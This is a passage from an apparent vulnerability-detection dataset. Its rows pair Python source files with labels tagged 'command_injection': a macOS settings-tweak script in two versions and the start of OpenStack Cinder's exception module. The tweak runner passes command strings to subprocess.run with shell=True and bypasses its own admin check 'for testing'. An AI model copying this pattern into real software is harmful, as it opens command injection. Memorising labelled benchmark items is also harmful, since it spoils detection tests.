        dglogger.log_error(e, file=sys.stderr)
    except KeyError as e:
        dglogger.log_error(e, file=sys.stderr)
    except TypeError as e:
        dglogger.log_error(e)

def run_interactive_mode():
    print(""Interactive not implemented"")


def run_list_mode(indent = '    '):
    """"""helper function to print summary info from the tweaks list.

    :global arg.list: replies on global results from parser.
    :param indent: number of spaces to indent. Defaults to 4.
    :return:
    """"""
    print(""--list: "" + str(args.list))

    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':
        grp = set()
        for s in tweaks.tweaks:
            grp.add(s['group'])

        print('The groups are:')
        for t in sorted(grp):
            print(indent + t)

    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':
        descriptions = set()
        for d in tweaks.tweaks:
            descriptions.add(d['group'] + ' | ' + d['description'])

        print('group | description:')
        for t in sorted(descriptions):
            print(indent + t)


def main():
    log_file = dglogger.log_config()

    dglogger.log_start()

    parser = argparse.ArgumentParser(
        description=""""""install_mac_tweaks changes user and global settings to improve performance, security, 
    and convenience. Results logged to a file.""""""
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument(""--mode"", choices=['b', 'batch', 'i', 'interactive'],
                   action = 'store', default = 'batch',
                   help='Run interactively to confirm each change.')
    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],
                   action = 'store',
                   help='Print lists of the groups and set commands. Silently ignores --groups.')
    parser.add_argument('--groups', type = str, nargs='+',
                    help='Select a subset of tweaks to execute')
    args = parser.parse_args()

    try:
        import tweaks
    except ImportError as e:
        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_end(log_file)
        sys.exit(1)

    if args.list is not None:
        run_list_mode()
        sys.exit(0)
    elif args.mode == 'batch' or args.mode == 'b':
        run_batch_mode(tweaks.tweaks, args)
    elif args.mode == 'interactive' or args.mode == 'i':
        run_interactive_mode()

    dglogger.log_end(log_file)


if __name__ == '__main__':
    main()
else:
    print(""WARNING: Was not expecting to be imported. Exiting."")

# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse
# pswd = getpass.getpass()
# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile
# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/
# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password
# --list output to less or more for pagination
/n/n/nos-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3
#  -*- coding: utf-8 -*-

# Definition of OS X/MacOS tweaks
# group, description, set, get, os_v_min, os_ver_max

tweaks = [
    {'group': 'test',
     'description': 'Test exception handling',
     'get': ""foobar"",
     'set': ""set-foobar"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening and closing windows.',
     'get': ""defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled"",
     'set': ""defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening a Quick Look window.',
     'set': ""defaults write -g QLPanelAnimationDuration -float 0"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animation when opening the Info window in OS X Finder (cmd⌘ + i).',
     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',
     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when you open an application from the Dock.',
     'set': 'defaults write com.apple.dock launchanim -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Always show the full URL in the search/url field',
     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',
     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'admin',
     'description': 'Show Recovery partition & EFI Boot partition',
     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',
     'os_v_min': '10.09', 'os_v_max': '10.10'
     },
    {'group': 'general',
     'description': 'Disable shadow in screenshots',
     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable Bonjour multicast advertisements.\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',
     'get': 'defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',
     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable WiFi hotspot screen',
     'get': 'defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',
     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Don’t show Dashboard as a Space',
     'get': 'defaults read com.apple.dock dashboard-in-overlay',
     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Show file path in title of finder window',
     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Enable AirDrop feature for ethernet connected Macs',
     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Always show scroll bars',
     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string ""Always""',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Expand Save panel by default (1/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Expand Save panel by default (2/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Make all animations faster that are used by Mission Control.',
     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the delay when you hide the Dock',
     'set': 'defaults write com.apple.Dock autohide-delay -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Remove the animation when hiding/showing the Dock',
     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the animation when you replying to an e-mail',
     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Disable the animation when you sending an e-mail',
     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the standard delay in rendering a Web page.',
     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',
     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Disable smooth scrolling for paging (space bar)',
     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on network volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on USB volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Show the ~/Library folder',
     'set': 'chflags nohidden ~/Library',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Save to disk (not to iCloud) by default',
     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the warning when changing a file extension',
     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     }
]
/n/n/n",0,command_injection
3,25,bb2ded2dbbbac8966a77cc8aa227011a8b8772c0,"/os-x-config/standard_tweaks/install_mac_tweaks.py/n/n#! /usr/bin/env python3
""""""
Set user settings to optimize performance, Finder and windowing features, and automate standard preference
settings.

While this is an Apple specific script, it doesn't check to see if it's executing on a Mac.
""""""

import dglogger
import argparse
import os
import getpass
import grp
import platform
import re
import pexpect
import shlex
import subprocess
import sys


def is_admin():
    """"""Check to see if the user belongs to the 'admin' group.

    :return: boolean
    """"""
    return os.getlogin() in grp.getgrnam('admin').gr_mem


def is_executable(tweak_group, groups, is_admin = is_admin()):
    """"""Determines if the tweak should be executed.

    :param tweak_group: tweak's group key value.
    :param groups: groups specified on the command line.
    :param is_admin: True if user belongs to 'admn' group.
    :rtype: boolean
    """"""
    return True # for testing
    if groups is None and tweak_group != 'sudo':
        return True
    if groups is None and tweak_group == 'sudo' and is_admin:
        return True
    if groups is not None and tweak_group in groups and tweak_group != 'sudo':
        return True
    if groups is not None and tweak_group in groups and tweak_group == 'sudo' and is_admin:
        return True
    return False


def os_supported(min_v, max_v):
    """"""Checks to see if the preference is supported on your version of the Mac OS.
    NB: 10.9 is represented in the tweaks.py file as 10.09.

    :param min_v:
    :param max_v:
    :return: boolean
    """"""
    os_version = re.match('[0-9]+\.[0-9]+', platform.mac_ver()[0]).group(0)  # major.minor
    return not (os_version < str(min_v) or (max_v is not None and os_version > str(max_v)))


def run_batch_mode(tweaks, args):
    for t in tweaks:
        if os_supported(t['os_v_min'], t['os_v_max']) \
                and is_executable(t['group'], args.groups, is_admin()) \
                and t['group'] != 'test':
            run_command(t['set'])


def run_command(cmd):
    try:
        subprocess.run(cmd, shell=True, timeout=60, check=True)
        dglogger.log_info(str(cmd))
    except subprocess.CalledProcessError as e:
#        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_error(str(e)) # figure out deal w/file=sys.stderr!
    except subprocess.TimeoutExpired as e:
        dglogger.log_error(e, file=sys.stderr)
    except OSError as e:
        dglogger.log_error(e, file=sys.stderr)
    except KeyError as e:
        dglogger.log_error(e, file=sys.stderr)
    except TypeError as e:
        dglogger.log_error(e)

def run_interactive_mode():
    print(""Interactive not implemented"")


def run_list_mode(indent = '    '):
    """"""helper function to print summary info from the tweaks list.

    :global arg.list: replies on global results from parser.
    :param indent: number of spaces to indent. Defaults to 4.
    :return:
    """"""
    print(""--list: "" + str(args.list))

    if args.list == 'a' or args.list == 'all' or args.list == 'g' or args.list == 'groups':
        grp = set()
        for s in tweaks.tweaks:
            grp.add(s['group'])

        print('The groups are:')
        for t in sorted(grp):
            print(indent + t)

    if args.list == 'a' or args.list == 'all' or args.list == 'd' or args.list == 'descriptions':
        descriptions = set()
        for d in tweaks.tweaks:
            descriptions.add(d['group'] + ' | ' + d['description'])

        print('group | description:')
        for t in sorted(descriptions):
            print(indent + t)


def main():
    log_file = dglogger.log_config()

    dglogger.log_start()

    parser = argparse.ArgumentParser(
        description=""""""install_mac_tweaks changes user and global settings to improve performance, security, 
    and convenience. Results logged to a file.""""""
    )
    group = parser.add_mutually_exclusive_group()
    group.add_argument(""--mode"", choices=['b', 'batch', 'i', 'interactive'],
                   action = 'store', default = 'batch',
                   help='Run interactively to confirm each change.')
    group.add_argument('--list', choices = ['all', 'a', 'groups', 'g', 'descriptions', 'd'],
                   action = 'store',
                   help='Print lists of the groups and set commands. Silently ignores --groups.')
    parser.add_argument('--groups', type = str, nargs='+',
                    help='Select a subset of tweaks to execute')
    args = parser.parse_args()

    try:
        import tweaks
    except ImportError as e:
        dglogger.log_error(e, file=sys.stderr)
        dglogger.log_end(log_file)
        sys.exit(1)

    if args.list is not None:
        run_list_mode()
        sys.exit(0)
    elif args.mode == 'batch' or args.mode == 'b':
        run_batch_mode(tweaks.tweaks, args)
    elif args.mode == 'interactive' or args.mode == 'i':
        run_interactive_mode()

    dglogger.log_end(log_file)


if __name__ == '__main__':
    main()
else:
    print(""WARNING: Was not expecting to be imported. Exiting."")

# regex to replace i and b for mode - code or argsparse fiddling - probably can do in argparse
# pswd = getpass.getpass()
# getpass.getuser() for user name - check this code, installer.py & dot-profile, rpr-3-sort-a-diofile.site, home-profile
# # Sorting dictionaries: https://stackoverflow.com/questions/20944483/pythonct-by-its-values/20948781?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
# Sorting dictionaries: https://www.pythoncentral.io/how-to-sort-python-dictionaries-by-key-or-value/
# Asking for a password: https://askubuntu.com/questions/155791/how-do-i-sudo-a-command-in-a-script-without-being-asked-for-a-password
# Add shlex parsing for safe passing of parameters
# --list output to less or more for pagination
/n/n/n/os-x-config/standard_tweaks/tweaks.py/n/n#! /usr/bin/env python3
#  -*- coding: utf-8 -*-

# Definition of OS X/MacOS tweaks
# group, description, set, get, os_v_min, os_ver_max

tweaks = [
    {'group': 'test',
     'description': 'Test exception handling',
     'get': ""foobar"",
     'set': ""set-foobar"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening and closing windows.',
     'get': ""defaults read NSGlobalDomain NSAutomaticWindowAnimationsEnabled"",
     'set': ""defaults write NSGlobalDomain NSAutomaticWindowAnimationsEnabled -bool false"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when opening a Quick Look window.',
     'set': ""defaults write -g QLPanelAnimationDuration -float 0"",
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animation when opening the Info window in OS X Finder (cmd⌘ + i).',
     'set': 'defaults write com.apple.finder DisableAllAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Accelerated playback when adjusting the window size (Cocoa applications).',
     'set': 'defaults write NSGlobalDomain NSWindowResizeTime -float 0.001',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'animation',
     'description': 'Disable animations when you open an application from the Dock.',
     'set': 'defaults write com.apple.dock launchanim -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Always show the full URL in the search/url field',
     'get': 'defaults read com.apple.Safari ShowFullURLInSmartSearchField',
     'set': 'defaults write com.apple.Safari ShowFullURLInSmartSearchField -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'admin',
     'description': 'Show Recovery partition & EFI Boot partition',
     'set': 'defaults write com.apple.DiskUtility DUDebugMenuEnabled -bool true',
     'os_v_min': '10.09', 'os_v_max': '10.10'
     },
    {'group': 'general',
     'description': 'Disable shadow in screenshots',
     'set': 'defaults write com.apple.screencapture disable-shadow -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable Bonjour multicast advertisements.\n  See https://www.trustwave.com/Resources/SpiderLabs-Blog/mDNS---Telling-the-world-about-you-(and-your-device)/',
     'get': 'sudo defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',
     'set': 'sudo defaults write /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements -bool YES',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'sudo',
     'description': 'Disable WiFi hotspot screen',
     'get': 'sudo defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',
     'set': 'sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.captive.control Active -boolean false',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Don’t show Dashboard as a Space',
     'get': 'defaults read com.apple.dock dashboard-in-overlay',
     'set': 'defaults write com.apple.dock dashboard-in-overlay -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Show file path in title of finder window',
     'set': 'defaults write com.apple.finder _FXShowPosixPathInTitle -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Enable AirDrop feature for ethernet connected Macs',
     'set': 'defaults write com.apple.NetworkBrowser BrowseAllInterfaces -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Always show scroll bars',
     'set': 'defaults write NSGlobalDomain AppleShowScrollBars -string ""Always""',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Expand Save panel by default (1/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general',
     'description': 'Expand Save panel by default (2/2)',
     'set': 'defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general', 'description': 'Expand Print menu by default (1/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'general', 'description': 'Expand Print menu by default (2/2)',
     'set': 'defaults write NSGlobalDomain PMPrintingExpandedStateforPrint2 -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Make all animations faster that are used by Mission Control.',
     'set': 'defaults write com.apple.dock expose-animation-duration -float 0.1',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the delay when you hide the Dock',
     'set': 'defaults write com.apple.Dock autohide-delay -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Remove the animation when hiding/showing the Dock',
     'set': 'defaults write com.apple.dock autohide-time-modifier -float 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the animation when you replying to an e-mail',
     'set': 'defaults write com.apple.mail DisableReplyAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'app',
     'description': 'Disable the animation when you sending an e-mail',
     'set': 'defaults write com.apple.mail DisableSendAnimations -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'app',
     'description': 'Disable the standard delay in rendering a Web page.',
     'set': 'defaults write com.apple.Safari WebKitInitialTimedLayoutDelay 0.25',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'The keyboard react faster to keystrokes (not equally useful for everyone)',
     'set': 'defaults write NSGlobalDomain KeyRepeat -int 0',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'general',
     'description': 'Disable smooth scrolling for paging (space bar)',
     'set': 'defaults write -g NSScrollAnimationEnabled -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on network volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },
    {'group': 'Finder',
     'description': 'Avoid creating .DS_Store files on USB volumes',
     'set': 'defaults write com.apple.desktopservices DSDontWriteUSBStores -bool true',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Show the ~/Library folder',
     'set': 'chflags nohidden ~/Library',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Save to disk (not to iCloud) by default',
     'set': 'defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     },

    {'group': 'Finder',
     'description': 'Disable the warning when changing a file extension',
     'set': 'defaults write com.apple.finder FXEnableExtensionChangeWarning -bool false',
     'os_v_min': '10.09', 'os_v_max': None
     }
]
/n/n/n",1,command_injection
4,74,f752302d181583a95cf44354aea607ce9d9283f4,"cinder/exception.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2010 United States Government as represented by the
# Administrator of the National Aeronautics and Space Administration.
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

""""""Cinder base exception handling.

Includes decorator for re-raising Cinder-type exceptions.

SHOULD include dedicated exception logging.

""""""

import sys

from oslo.config import cfg
import webob.exc

from cinder.openstack.common import exception as com_exception
from cinder.openstack.common import log as logging


LOG = logging.getLogger(__name__)

exc_log_opts = [
    cfg.BoolOpt('fatal_exception_format_errors',
                default=False,
                help='make exception message format errors fatal'),
]

CONF = cfg.CONF
CONF.register_opts(exc_log_opts)


class ConvertedException(webob.exc.WSGIHTTPException):
    def __init__(self, code=0, title="""", explanation=""""):
        self.code = code
        self.title = title
        self.explanation = explanation
        super(ConvertedException, self).__init__()


class ProcessExecutionError(IOError):
    def __init__(self, stdout=None, stderr=None, exit_code=None, cmd=None,
                 description=None):
        self.exit_code = exit_code
        self.stderr = stderr
        self.stdout = stdout
        self.cmd = cmd
        self.description = description

        if description is None:
            description = _('Unexpected error while running command.')
        if exit_code is None:
            exit_code = '-'
        message = _('%(description)s\nCommand: %(cmd)s\n'
                    'Exit code: %(exit_code)s\nStdout: %(stdout)r\n'
                    'Stderr: %(stderr)r') % {
                        'description': description,
                        'cmd': cmd,
                        'exit_code': exit_code,
                        'stdout': stdout,
                        'stderr': stderr,
                    }
        IOError.__init__(self, message)


Error = com_exception.Error


class CinderException(Exception):
    """"""Base Cinder Exception

    To correctly use this class, inherit from it and define
    a 'message' property. That message will get printf'd
    with the keyword arguments provided to the constructor.

    """"""
    message = _(""An unknown exception occurred."")
    code = 500
    headers = {}
    safe = False

    def __init__(self, message=None, **kwargs):
        self.kwargs = kwargs

        if 'code' not in self.kwargs:
            try:
                self.kwargs['code'] = self.code
            except AttributeError:
                pass

        if not message:
            try:
                message = self.message % kwargs

            except Exception:
                exc_info = sys.exc_info()
                # kwargs doesn't match a variable in the message
                # log the issue and the kwargs
                LOG.exception(_('Exception in string format operation'))
                for name, value in kwargs.iteritems():
                    LOG.error(""%s: %s"" % (name, value))
                if CONF.fatal_exception_format_errors:
                    raise exc_info[0], exc_info[1], exc_info[2]
                # at least get the core message out if something happened
                message = self.message

        super(CinderException, self).__init__(message)


class GlanceConnectionFailed(CinderException):
    message = _(""Connection to glance failed"") + "": %(reason)s""


class NotAuthorized(CinderException):
    message = _(""Not authorized."")
    code = 403


class AdminRequired(NotAuthorized):
    message = _(""User does not have admin privileges"")


class PolicyNotAuthorized(NotAuthorized):
    message = _(""Policy doesn't allow %(action)s to be performed."")


class ImageNotAuthorized(CinderException):
    message = _(""Not authorized for image %(image_id)s."")


class Invalid(CinderException):
    message = _(""Unacceptable parameters."")
    code = 400


class InvalidSnapshot(Invalid):
    message = _(""Invalid snapshot"") + "": %(reason)s""


class InvalidSourceVolume(Invalid):
    message = _(""Invalid source volume %(reason)s."")


class VolumeAttached(Invalid):
    message = _(""Volume %(volume_id)s is still attached, detach volume first."")


class SfJsonEncodeFailure(CinderException):
    message = _(""Failed to load data into json format"")


class InvalidRequest(Invalid):
    message = _(""The request is invalid."")


class InvalidResults(Invalid):
    message = _(""The results are invalid."")


class InvalidInput(Invalid):
    message = _(""Invalid input received"") + "": %(reason)s""


class InvalidVolumeType(Invalid):
    message = _(""Invalid volume type"") + "": %(reason)s""


class InvalidVolume(Invalid):
    message = _(""Invalid volume"") + "": %(reason)s""


class InvalidContentType(Invalid):
    message = _(""Invalid content type %(content_type)s."")


class InvalidHost(Invalid):
    message = _(""Invalid host"") + "": %(reason)s""


# Cannot be templated as the error syntax varies.
# msg needs to be constructed when raised.
class InvalidParameterValue(Invalid):
    message = _(""%(err)s"")


class InvalidAuthKey(Invalid):
    message = _(""Invalid auth key"") + "": %(reason)s""


class ServiceUnavailable(Invalid):
    message = _(""Service is unavailable at this time."")


class ImageUnacceptable(Invalid):
    message = _(""Image %(image_id)s is unacceptable: %(reason)s"")


class DeviceUnavailable(Invalid):
    message = _(""The device in the path %(path)s is unavailable: %(reason)s"")


class InvalidUUID(Invalid):
    message = _(""Expected a uuid but received %(uuid)s."")


class NotFound(CinderException):
    message = _(""Resource could not be found."")
    code = 404
    safe = True


class PersistentVolumeFileNotFound(NotFound):
    message = _(""Volume %(volume_id)s persistence file could not be found."")


class VolumeNotFound(NotFound):
    message = _(""Volume %(volume_id)s could not be found."")


class SfAccountNotFound(NotFound):
    message = _(""Unable to locate account %(account_name)s on ""
                ""Solidfire device"")


class VolumeNotFoundForInstance(VolumeNotFound):
    message = _(""Volume not found for instance %(instance_id)s."")


class VolumeMetadataNotFound(NotFound):
    message = _(""Volume %(volume_id)s has no metadata with ""
                ""key %(metadata_key)s."")


class InvalidVolumeMetadata(Invalid):
    message = _(""Invalid metadata"") + "": %(reason)s""


class InvalidVolumeMetadataSize(Invalid):
    message = _(""Invalid metadata size"") + "": %(reason)s""


class SnapshotMetadataNotFound(NotFound):
    message = _(""Snapshot %(snapshot_id)s has no metadata with ""
                ""key %(metadata_key)s."")


class InvalidSnapshotMetadata(Invalid):
    message = _(""Invalid metadata"") + "": %(reason)s""


class InvalidSnapshotMetadataSize(Invalid):
    message = _(""Invalid metadata size"") + "": %(reason)s""


class VolumeTypeNotFound(NotFound):
    message = _(""Volume type %(volume_type_id)s could not be found."")


class VolumeTypeNotFoundByName(VolumeTypeNotFound):
    message = _(""Volume type with name %(volume_type_name)s ""
                ""could not be found."")


class VolumeTypeExtraSpecsNotFound(NotFound):
    message = _(""Volume Type %(volume_type_id)s has no extra specs with ""
                ""key %(extra_specs_key)s."")


class SnapshotNotFound(NotFound):
    message = _(""Snapshot %(snapshot_id)s could not be found."")


class VolumeIsBusy(CinderException):
    message = _(""deleting volume %(volume_name)s that has snapshot"")


class SnapshotIsBusy(CinderException):
    message = _(""deleting snapshot %(snapshot_name)s that has ""
                ""dependent volumes"")


class ISCSITargetNotFoundForVolume(NotFound):
    message = _(""No target id found for volume %(volume_id)s."")


class ISCSITargetCreateFailed(CinderException):
    message = _(""Failed to create iscsi target for volume %(volume_id)s."")


class ISCSITargetAttachFailed(CinderException):
    message = _(""Failed to attach iSCSI target for volume %(volume_id)s."")


class ISCSITargetRemoveFailed(CinderException):
    message = _(""Failed to remove iscsi target for volume %(volume_id)s."")


class DiskNotFound(NotFound):
    message = _(""No disk at %(location)s"")


class InvalidImageRef(Invalid):
    message = _(""Invalid image href %(image_href)s."")


class ImageNotFound(NotFound):
    message = _(""Image %(image_id)s could not be found."")


class ServiceNotFound(NotFound):
    message = _(""Service %(service_id)s could not be found."")


class HostNotFound(NotFound):
    message = _(""Host %(host)s could not be found."")


class SchedulerHostFilterNotFound(NotFound):
    message = _(""Scheduler Host Filter %(filter_name)s could not be found."")


class SchedulerHostWeigherNotFound(NotFound):
    message = _(""Scheduler Host Weigher %(weigher_name)s could not be found."")


class HostBinaryNotFound(NotFound):
    message = _(""Could not find binary %(binary)s on host %(host)s."")


class InvalidReservationExpiration(Invalid):
    message = _(""Invalid reservation expiration %(expire)s."")


class InvalidQuotaValue(Invalid):
    message = _(""Change would make usage less than 0 for the following ""
                ""resources: %(unders)s"")


class QuotaNotFound(NotFound):
    message = _(""Quota could not be found"")


class QuotaResourceUnknown(QuotaNotFound):
    message = _(""Unknown quota resources %(unknown)s."")


class ProjectQuotaNotFound(QuotaNotFound):
    message = _(""Quota for project %(project_id)s could not be found."")


class QuotaClassNotFound(QuotaNotFound):
    message = _(""Quota class %(class_name)s could not be found."")


class QuotaUsageNotFound(QuotaNotFound):
    message = _(""Quota usage for project %(project_id)s could not be found."")


class ReservationNotFound(QuotaNotFound):
    message = _(""Quota reservation %(uuid)s could not be found."")


class OverQuota(CinderException):
    message = _(""Quota exceeded for resources: %(overs)s"")


class MigrationNotFound(NotFound):
    message = _(""Migration %(migration_id)s could not be found."")


class MigrationNotFoundByStatus(MigrationNotFound):
    message = _(""Migration not found for instance %(instance_id)s ""
                ""with status %(status)s."")


class FileNotFound(NotFound):
    message = _(""File %(file_path)s could not be found."")


class ClassNotFound(NotFound):
    message = _(""Class %(class_name)s could not be found: %(exception)s"")


class NotAllowed(CinderException):
    message = _(""Action not allowed."")


#TODO(bcwaldon): EOL this exception!
